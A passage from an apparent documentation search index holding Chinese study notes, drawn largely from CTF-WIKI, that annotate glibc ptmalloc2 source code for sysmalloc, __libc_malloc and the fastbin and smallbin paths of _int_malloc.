#endif #endif \u4e0b\u9762\u4e3a\u8fd9\u90e8\u5206\u4ee3\u7801\uff0c\u76ee\u524d\u4e0d\u662f\u6211\u4eec\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u53ef\u4ee5\u6682\u65f6\u8df3\u8fc7\u3002 /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))) { char *mm; /* return value from mmap call*/ try_mmap: /* Round up size to nearest page. For mmapped chunks, the overhead is one SIZE_SZ unit larger than for normal chunks, because there is no following chunk whose prev_size field could be used. See the front_misalign handling below, for glibc there is no need for further alignments unless we have have high alignment. */ if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) size = ALIGN_UP(nb + SIZE_SZ, pagesize); else size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize); tried_mmap = true; /* Don't try if size wraps around 0 */ if ((unsigned long)(size) > (unsigned long)(nb)) { mm = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0)); if (mm != MAP_FAILED) { /* The offset to the start of the mmapped region is stored in the prev_size field of the chunk. This allows us to adjust returned start address to meet alignment requirements here and in memalign(), and still be able to compute proper address argument for later munmap in free() and realloc(). */ if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) { /* For glibc, chunk2mem increases the address by 2*SIZE_SZ and MALLOC_ALIGN_MASK is 2*SIZE_SZ-1. Each mmap'ed area is page aligned and therefore definitely MALLOC_ALIGN_MASK-aligned. */ assert(((INTERNAL_SIZE_T)chunk2mem(mm) & MALLOC_ALIGN_MASK) == 0); front_misalign = 0; } else front_misalign = (INTERNAL_SIZE_T)chunk2mem(mm) & MALLOC_ALIGN_MASK; if (front_misalign > 0) { correction = MALLOC_ALIGNMENT - front_misalign; p = (mchunkptr)(mm + correction); set_prev_size(p, correction); set_head(p, (size - correction) | IS_MMAPPED); } else { p = (mchunkptr)mm; set_prev_size(p, 0); set_head(p, size | IS_MMAPPED); } /* update statistics */ int new = atomic_exchange_and_add(&mp_.n_mmaps, 1) + 1; atomic_max(&mp_.max_n_mmaps, new); unsigned long sum; sum = atomic_exchange_and_add(&mp_.mmapped_mem, size) + size; atomic_max(&mp_.max_mmapped_mem, sum); check_chunk(av, p); return chunk2mem(p); } } } mmap \u5931\u8d25\u6216\u8005\u672a\u5206\u914d\u5806 /* There are no usable arenas and mmap also failed. */ if (av == NULL) return 0; \u5982\u679c\u662f\u8fd9\u4e24\u79cd\u60c5\u51b5\u4e2d\u7684\u4efb\u4f55\u4e00\u79cd\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u9000\u51fa\u4e86\u3002\u3002 \u8bb0\u5f55\u65e7\u5806\u4fe1\u606f /* Record incoming configuration of top */ old_top = av->top; old_size = chunksize(old_top); old_end = (char *)(chunk_at_offset(old_top, old_size)); brk = snd_brk = (char *)(MORECORE_FAILURE); \u68c0\u67e5\u65e7\u5806\u4fe1\u606f 1 /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert((old_top == initial_top(av) && old_size == 0) || ((unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) && ((unsigned long)old_end & (pagesize - 1)) == 0)); \u8fd9\u4e2a\u68c0\u67e5\u8981\u6c42\u6ee1\u8db3\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u6761\u4ef6 old_top == initial_top(av) && old_size == 0 \uff0c\u5373\u5982\u679c\u662f\u7b2c\u4e00\u6b21\u7684\u8bdd\uff0c\u5806\u7684\u5927\u5c0f\u9700\u8981\u662f 0\u3002 \u65b0\u7684\u5806\uff0c\u90a3\u4e48 (unsigned long)(old_size) >= MINSIZE && prev_inuse(old_top) \uff0c\u5806\u7684\u5927\u5c0f\u5e94\u8be5\u4e0d\u5c0f\u4e8e MINSIZE \uff0c\u5e76\u4e14\u524d\u4e00\u4e2a\u5806\u5757\u5e94\u8be5\u5904\u4e8e\u4f7f\u7528\u4e2d\u3002 ((unsigned long)old_end & (pagesize - 1)) == 0) \uff0c\u5806\u7684\u7ed3\u675f\u5730\u5740\u5e94\u8be5\u662f\u9875\u5bf9\u9f50\u7684\uff0c\u7531\u4e8e\u9875\u5bf9\u9f50\u7684\u5927\u5c0f\u9ed8\u8ba4\u662f 0x1000\uff0c\u6240\u4ee5\u4f4e 12 \u4e2a\u6bd4\u7279\u9700\u8981\u4e3a 0\u3002 \u68c0\u67e5\u65e7\u5806\u4fe1\u606f 2 /* Precondition: not enough current space to satisfy nb request */ assert((unsigned long)(old_size) < (unsigned long)(nb + MINSIZE)); \u6839\u636e malloc \u4e2d\u7684\u5b9a\u4e49 static void *_int_malloc(mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ nb \u5e94\u8be5\u662f\u5df2\u7ecf\u52a0\u4e0a chunk \u5934\u90e8\u7684\u5b57\u8282\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981\u52a0\u4e0a MINSIZE \u5462\uff1f\u8fd9\u662f\u56e0\u4e3a top chunk \u7684\u5927\u5c0f\u5e94\u8be5\u81f3\u5c11\u9884\u7559 MINSIZE \u7a7a\u95f4\uff0c\u4ee5\u4fbf\u4e8e\u5408\u5e76\u3002 \u975e main_arena \u8fd9\u91cc\u6682\u65f6\u4e0d\u662f\u5173\u5fc3\u7684\u91cd\u70b9\uff0c\u6682\u4e14\u4e0d\u5206\u6790\u3002 if (av != &main_arena) { heap_info *old_heap, *heap; size_t old_heap_size; /* First try to extend the current heap. */ old_heap = heap_for_ptr(old_top); old_heap_size = old_heap->size; if ((long)(MINSIZE + nb - old_size) > 0 && grow_heap(old_heap, MINSIZE + nb - old_size) == 0) { av->system_mem += old_heap->size - old_heap_size; set_head(old_top, (((char *)old_heap + old_heap->size) - (char *)old_top) | PREV_INUSE); } else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) { /* Use a newly allocated heap. */ heap->ar_ptr = av; heap->prev = old_heap; av->system_mem += heap->size; /* Set up the new top. */ top(av) = chunk_at_offset(heap, sizeof(*heap)); set_head(top(av), (heap->size - sizeof(*heap)) | PREV_INUSE); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. */ /* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */ old_size = (old_size - MINSIZE) & ~MALLOC_ALIGN_MASK; set_head(chunk_at_offset(old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE); if (old_size >= MINSIZE) { set_head(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ)); set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free(av, old_top, 1); } else { set_head(old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE); set_foot(old_top, (old_size + 2 * SIZE_SZ)); } } else if (!tried_mmap) /* We can at least try to use to mmap memory. */ goto try_mmap; } Main_arena \u5904\u7406 \u8ba1\u7b97\u5185\u5b58 \u8ba1\u7b97\u53ef\u4ee5\u6ee1\u8db3\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u5c0f\u3002 else { /* av == main_arena */ /* Request enough space for nb + pad + overhead */ size = nb + mp_.top_pad + MINSIZE; \u9ed8\u8ba4\u60c5\u51b5\u4e0b top_pad \u5b9a\u4e49\u4e3a #ifndef DEFAULT_TOP_PAD # define DEFAULT_TOP_PAD 131072 #endif \u5373 131072 \u5b57\u8282\uff0c0x20000 \u5b57\u8282\u3002 \u662f\u5426\u8fde\u7eed \u5982\u679c\u6211\u4eec\u5e0c\u671b\u5806\u7684\u7a7a\u95f4\u8fde\u7eed\u7684\u8bdd\uff0c\u90a3\u4e48\u5176\u5b9e\u53ef\u4ee5\u590d\u7528\u4e4b\u524d\u7684\u5185\u5b58\u3002 /* If contiguous, we can subtract out existing space that we hope to combine with new space. We add it back later only if we don't actually get contiguous space. */ if (contiguous(av)) size -= old_size; \u5bf9\u9f50\u9875\u5927\u5c0f /* Round to a multiple of page size. If MORECORE is not contiguous, this ensures that we only call it with whole-page arguments. And if MORECORE is contiguous and this is not first time through, this preserves page-alignment of previous calls. Otherwise, we correct to page-align below. */ size = ALIGN_UP(size, pagesize); \u7533\u8bf7\u5185\u5b58 /* Don't try to call MORECORE if argument is so big as to appear negative. Note that since mmap takes size_t arg, it may succeed below even if we cannot call MORECORE. */ if (size > 0) { brk = (char *)(MORECORE(size)); LIBC_PROBE(memory_sbrk_more, 2, brk, size); } \u53ef\u80fd\u6210\u529f if (brk != (char *)(MORECORE_FAILURE)) { /* Call the `morecore' hook if necessary. */ void (*hook)(void) = atomic_forced_read(__after_morecore_hook); if (__builtin_expect(hook != NULL, 0)) (*hook)(); } \u8fd9\u91cc\u7adf\u7136\u8c03\u7528\u4e86\u4e00\u4e2a hook\uff0c\u6709\u70b9\u610f\u601d\u3002 \u5931\u8d25 \u5931\u8d25\uff0c\u8003\u8651 mmap\u3002 else { /* If have mmap, try using it as a backup when MORECORE fails or cannot be used. This is worth doing on systems that have \"holes\" in address space, so sbrk cannot extend to give contiguous space, but space is available elsewhere. Note that we ignore mmap max count and threshold limits, since the space will not be used as a segregated mmap region. */ /* Cannot merge with old top, so add its size back in */ if (contiguous(av)) size = ALIGN_UP(size + old_size, pagesize); /* If we are relying on mmap as backup, then use larger units */ if ((unsigned long)(size) < (unsigned long)(MMAP_AS_MORECORE_SIZE)) size = MMAP_AS_MORECORE_SIZE; /* Don't try if size wraps around 0 */ if ((unsigned long)(size) > (unsigned long)(nb)) { char *mbrk = (char *)(MMAP(0, size, PROT_READ | PROT_WRITE, 0)); if (mbrk != MAP_FAILED) { /* We do not need, and cannot use, another sbrk call to find end */ brk = mbrk; snd_brk = brk + size; /* Record that we no longer have a contiguous sbrk region. After the first time mmap is used as backup, we do not ever rely on contiguous space since this could incorrectly bridge regions. */ set_noncontiguous(av); } } } \u5185\u5b58\u53ef\u80fd\u7533\u8bf7\u6210\u529f if (brk != (char *)(MORECORE_FAILURE)) { if (mp_.sbrk_base == 0) mp_.sbrk_base = brk; av->system_mem += size; \u60c5\u51b5 1 /* If MORECORE extends previous space, we can likewise extend top size. */ if (brk == old_end && snd_brk == (char *)(MORECORE_FAILURE)) set_head(old_top, (size + old_size) | PREV_INUSE); \u60c5\u51b5 2 - \u610f\u5916\u5185\u5b58\u8017\u5c3d else if (contiguous(av) && old_size && brk < old_end) /* Oops! Someone else killed our space.. Can't touch anything. */ malloc_printerr(\"break adjusted to free malloc space\"); \u5904\u7406\u5176\u4ed6\u610f\u5916\u60c5\u51b5 /* Otherwise, make adjustments: * If the first time through or noncontiguous, we need to call sbrk just to find out where the end of memory lies. * We need to ensure that all returned chunks from malloc will meet MALLOC_ALIGNMENT * If there was an intervening foreign sbrk, we need to adjust sbrk request size to account for fact that we will not be able to combine new space with existing space in old_top. * Almost all systems internally allocate whole pages at a time, in which case we might as well use the whole last page of request. So we allocate enough more memory to hit a page boundary now, which in turn causes future contiguous calls to page-align. */ else { front_misalign = 0; end_misalign = 0; correction = 0; aligned_brk = brk; \u5904\u7406\u8fde\u7eed\u5185\u5b58 /* handle contiguous cases */ if (contiguous(av)) { /* Count foreign sbrk as system_mem. */ if (old_size) av->system_mem += brk - old_end; /* Guarantee alignment of first new chunk made from this space */ front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) & MALLOC_ALIGN_MASK; if (front_misalign > 0) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ correction = MALLOC_ALIGNMENT - front_misalign; aligned_brk += correction; } /* If this isn't adjacent to existing space, then we will not be able to merge with old_top space, so must add to 2nd request. */ correction += old_size; /* Extend the end address to hit a page boundary */ end_misalign = (INTERNAL_SIZE_T)(brk + size + correction); correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign; assert(correction >= 0); snd_brk = (char *)(MORECORE(correction)); /* If can't allocate correction, try to at least find out current brk. It might be enough to proceed without failing. Note that if second sbrk did NOT fail, we assume that space is contiguous with first sbrk. This is a safe assumption unless program is multithreaded but doesn't use locks and a foreign sbrk occurred between our first and second calls. */ if (snd_brk == (char *)(MORECORE_FAILURE)) { correction = 0; snd_brk = (char *)(MORECORE(0)); } else { /* Call the `morecore' hook if necessary. */ void (*hook)(void) = atomic_forced_read(__after_morecore_hook); if (__builtin_expect(hook != NULL, 0)) (*hook)(); } } \u5904\u7406\u4e0d\u8fde\u7eed\u5185\u5b58 /* handle non-contiguous cases */ else { if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) /* MORECORE/mmap must correctly align */ assert(((unsigned long)chunk2mem(brk) & MALLOC_ALIGN_MASK) == 0); else { front_misalign = (INTERNAL_SIZE_T)chunk2mem(brk) & MALLOC_ALIGN_MASK; if (front_misalign > 0) { /* Skip over some bytes to arrive at an aligned position. We don't need to specially mark these wasted front bytes. They will never be accessed anyway because prev_inuse of av->top (and any chunk created from its start) is always true after initialization. */ aligned_brk += MALLOC_ALIGNMENT - front_misalign; } } /* Find out current end of memory */ if (snd_brk == (char *)(MORECORE_FAILURE)) { snd_brk = (char *)(MORECORE(0)); } } \u8c03\u6574 /* Adjust top based on results of second sbrk */ if (snd_brk != (char *)(MORECORE_FAILURE)) { av->top = (mchunkptr)aligned_brk; set_head(av->top, (snd_brk - aligned_brk + correction) | PREV_INUSE); av->system_mem += correction; /* If not the first time through, we either have a gap due to foreign sbrk or a non-contiguous region. Insert a double fencepost at old_top to prevent consolidation with space we don't own. These fenceposts are artificial chunks that are marked as inuse and are in any case too small to use. We need two to make sizes and alignments work out. */ if (old_size != 0) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) & ~MALLOC_ALIGN_MASK; set_head(old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ set_head(chunk_at_offset(old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_head(chunk_at_offset(old_top, old_size + 2 * SIZE_SZ), (2 * SIZE_SZ) | PREV_INUSE); /* If possible, release the rest. */ if (old_size >= MINSIZE) { _int_free(av, old_top, 1); } } } } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u8fd9\u91cc\u7a0b\u5e8f\u5c06\u65e7\u7684 top chunk \u8fdb\u884c\u4e86\u91ca\u653e\uff0c\u90a3\u4e48\u5176\u4f1a\u6839\u636e\u5927\u5c0f\u8fdb\u5165\u4e0d\u540c\u7684 bin \u6216 tcache \u4e2d\u3002 \u66f4\u65b0\u6700\u5927\u5185\u5b58 if ((unsigned long)av->system_mem > (unsigned long)(av->max_system_mem)) av->max_system_mem = av->system_mem; check_malloc_state(av); \u5206\u914d\u5185\u5b58\u5757 \u83b7\u53d6\u5927\u5c0f /* finally, do the allocation */ p = av->top; size = chunksize(p); \u5207\u5206 TOP /* check that one of the above allocation paths succeeded */ if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset(p, nb); av->top = remainder; set_head(p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, p, nb); return chunk2mem(p); } \u6355\u6349\u6240\u6709\u9519\u8bef /* catch all failure paths */ __set_errno(ENOMEM); return 0;","title":"\u5185\u5b58\u5757\u7533\u8bf7\u64cd\u4f5c"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_1","text":"Allocate Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u7533\u8bf7\u5185\u5b58\u5757"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#__libc_malloc","text":"\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709 malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002 \u8be5\u51fd\u6570\u4f1a \u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09 \uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5806\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c \u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002 // wapper for int_malloc void *__libc_malloc(size_t bytes) {//size_t \u4e3a\u5f53\u524d\u7a0b\u5e8f\u4f4d\u6570\u6700\u957f\u7684\u65e0\u7b26\u53f7int\u578b mstate ar_ptr; void * victim; // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook); if (__builtin_expect(hook != NULL, 0))//\u94a9\u5b50\u4e0d\u4e3a\u7a7a return (*hook)(bytes, RETURN_ADDRESS(0));//\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002 arena_get(ar_ptr, bytes); \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002 victim = _int_malloc(ar_ptr, bytes); \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002 /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim && ar_ptr != NULL) { LIBC_PROBE(memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry(ar_ptr, bytes); victim = _int_malloc(ar_ptr, bytes); } \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002 if (ar_ptr != NULL) __libc_lock_unlock(ar_ptr->mutex); \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58 \u8981\u4e48\u662f mmap \u7684\u5185\u5b58 \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684 arena \u4e2d assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim))); \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002 return victim; }","title":"__libc_malloc"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_int_malloc","text":"_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684 \u5185\u5b58\u5757\u5927\u5c0f \u4ee5\u53ca \u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6 \uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002 \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002 \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002 \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002 \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684 chunk \u5927\u5c0f\u3002 static void *_int_malloc(mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size(bytes, nb);","title":"_int_malloc"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#arena","text":"/* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if (__glibc_unlikely(av == NULL)) { void *p = sysmalloc(nb, av); if (p != NULL) alloc_perturb(p, bytes); return p; }","title":"arena"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#fast-bin","text":"\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if ((unsigned long) (nb) <= (unsigned long) (get_max_fast())) {//\u7533\u8bf7\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8efastbin\u4e0a\u9650 // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 idx = fastbin_index(nb); // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 mfastbinptr *fb = &fastbin(av, idx);//\u5355\u94fe\u8868 mchunkptr pp = *fb; // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim->fd, victim)) != victim); // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk if (victim != 0) { // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr(check_action, errstr, chunk2mem(victim), av); return NULL; } // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 check_remalloced_chunk(av, victim, nb); // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } }","title":"fast bin"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_2","text":"malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b fastbin \u662f\u4ece\u5934\u7ed3\u70b9\uff08\u6700\u65b0\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u540e\u51fa\u201d","title":"\u5c0f\u603b\u7ed3"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#fast-bin-malloc","text":"\u4e0d\u542f\u52a8 DEBUG \u65f6\uff0c\u53ea\u68c0\u67e5\u5373\u5c06\u5206\u914d chunk \u5bf9\u5e94\u7684 idx \u662f\u5426\u4e0e\u7533\u8bf7\u65f6\u7684 idx \u4e00\u81f4 \uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a chunksize(victim) \uff1a\u63d0\u53d6 victim size fastbin_index() \uff1a\u67e5\u627e victim size \u5bf9\u5e94\u7684 idx != idx \uff1a\u68c0\u67e5\u662f\u5426\u76f8\u7b49\uff0c\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u8c03\u7528 malloc_printerr \u6253\u5370\u9519\u8bef\u4fe1\u606f","title":"fast bin malloc \u68c0\u67e5\u673a\u5236"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#small-bin","text":"\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range(nb)) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index(nb); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at(av, idx); // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002 // \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5 if ((victim = last(bin)) != bin) { // \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002 if (victim == 0) /* initialization check */ // \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76 malloc_consolidate(av); // \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk else { // \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002 bck = victim->bk; // 